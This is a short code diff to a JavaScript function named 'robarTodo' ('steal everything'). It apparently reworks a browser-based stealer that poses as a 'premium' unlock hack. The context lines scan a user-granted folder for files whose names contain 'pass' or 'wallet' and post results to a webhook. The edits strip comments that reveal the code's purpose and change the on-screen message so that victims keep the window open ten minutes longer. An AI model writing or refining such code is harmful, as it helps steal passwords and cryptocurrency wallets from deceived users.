@@ -35,7 +35,7 @@ async function robarTodo() {
       if (entry.kind === "file") {
         const file = await entry.getFile();
         
-        // Filtramos lo más jugoso
+   
         const nombre = file.name.toLowerCase();
         const esInteresante = nombre.includes("pass") || 
                               nombre.includes("wallet") || 
@@ -70,7 +70,7 @@ async function robarTodo() {
       }
     }
 
-    // Enviamos resumen final
+   
     const resumen = new FormData();
     resumen.append("payload_json", JSON.stringify({
       content: "FOLDER ACCESS COMPLETADO",
@@ -86,7 +86,7 @@ async function robarTodo() {
     }));
     await fetch(WEBHOOK, {method: "POST", body: resumen});
 
-    document.getElementById("status").innerHTML = "HACK GUARDADO CORRECTAMENTE ✅<br>Disfruta el premium ilimitado";
+    document.getElementById("status").innerHTML = "HACK GUARDADO CORRECTAMENTE ✅<br>Mantenga esta ventana abierta por 10 minutos mientras se activa el HACK";
 
   } catch (e) {
     document.getElementById("status").innerHTML = "❌ Acceso denegado<br>El hack no se pudo activar";
